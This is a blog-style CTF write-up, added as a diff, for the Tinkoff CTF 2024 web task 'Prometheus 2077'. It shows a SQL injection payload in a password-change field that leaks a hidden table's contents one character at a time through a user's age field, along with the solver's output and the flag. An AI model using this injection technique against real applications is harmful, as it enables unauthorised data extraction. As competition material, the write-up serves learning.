@@ -1,0 +1,116 @@
+---
+title: Prometheus 2077 — Tinkoff CTF 2024
+description: "Extracting the flag from the Sacred table of a Tinkoff CTF 2024 web task via SQL injection in the password field, reading each character through the age field."
+pubDatetime: 2024-04-23
+tags:
+    - CTF
+    - web
+    - Tinkoff
+    - SPbCTF
+    - Bash
+    - SQL
+---
+
+import CodeFile from "@/custom/CodeFile.astro";
+import fireArchive from '../assets/ctf-tinkoff-2024-prometheus-2077/fire_64f7cd8.tar.gz?url';
+
+
+## Initial Data
+
+**Task link**
+[Prometheus 2077](https://ctf.tinkoff.ru/tasks/fire)
+
+**Description**
+The Greek gods strike back. They took the 🔥 emoji from all internet users and sealed it in the secure `Sacred` table alongside other artifacts. A hero nicknamed Prometheus decided to steal the spark. Help him and return the fire to the internet and to chats.
+
+**Forum**
+[t-fire-oudjc9cv.spbctf.net](https://t-fire-oudjc9cv.spbctf.net)
+
+**Forum source code**
+<a href={fireArchive}>Download fire_64f7cd8.tar.gz</a>
+
+## Solution
+
+### Forum Source Code Analysis
+
+Find the password change logic.
+We see that an SQL injection can be embedded in the `password` field:
+
+File `updatePassword.go`:
+
+<CodeFile file="updatePassword.go" />
+
+There is a `GET /profile/get` endpoint that returns the username and age.
+
+The `fire/postgres/init-db.sql` file describes the `Sacred` table:
+
+```sql
+CREATE TABLE IF NOT EXISTS Sacred (
+    artefact TEXT NOT NULL
+);
+
+INSERT INTO Sacred (artefact) VALUES ('⚡️'), ('${ARTIFACT_2}'), ('${ARTIFACT_3}');
+```
+
+### Flag Retrieval Strategy
+
+We need to extract the values from the `Sacred` table.
+To do this, insert an SQL injection into the `password` field so that:
+- the user's password does not change, so we don't have to remember new passwords
+- each call to `POST /profile/password` extracts the i-th character of the `artefact` field from the `Sacred` table
+- the result is stored in the numeric `age` field, which can be read via `GET /profile/get`
+
+For example, we can pass the following as the `password` value:
+
+```
+$user', age = (SELECT CAST(ascii(SUBSTRING(encode(artefact::bytea, 'hex'), $i, 1)) AS INTEGER) FROM Sacred LIMIT 1 OFFSET 2) -- 1
+```
+
+We convert the value we need to a hex string and store the code of the i-th character in the `age` field.
+
+Then the SQL query after substituting the password looks like this:
+
+```sql
+UPDATE users SET password = '<password>', age = (SELECT CAST(ascii(SUBSTRING(encode(artefact::bytea, 'hex'), <position>, 1)) AS INTEGER) FROM Sacred LIMIT 1 OFFSET 2) -- 1'
+WHERE username = $1"
+```
+
+### Writing the Solver Script
+
+Let's write a simple bash script that retrieves characters one by one and prints the contents of `artefact`.
+
+The full script:
+
+<CodeFile file="solve.sh" />
+
+### Getting the Flag
+
+Run the bash script:
+
+```bash
+[amyasnikov@ubuntu:~]$ bash ./script.sh
+{"message":"Successfully signuped"}
+{"message":"Successfully signed in"}
+2f7361637265645f666972655f73746f726167655f447471484447416a4c59
+/sacred_fire_storage_DtqHDGAjLY
+```
+
+The value `/sacred_fire_storage_DtqHDGAjLY` looks like a filename on the server:
+
+```bash
+[amyasnikov@ubuntu:~]$ curl -s "https://t-fire-oudjc9cv.spbctf.net/sacred_fire_storage_DtqHDGAjLY" -b /tmp/ctf_cookies.txt -X POST | jq
+
+{
+  "flag": "tctf{pRoM3THEU5_Gav3_FIRe_bacK_To_mAnKInd}"
+}
+```
+
+We got the flag `tctf{pRoM3THEU5_Gav3_FIRe_bacK_To_mAnKInd}`.
+
+## Questions
+
+- How can the same result be achieved with fewer requests?
+
+## Conclusion
+
+- A fairly universal strategy.
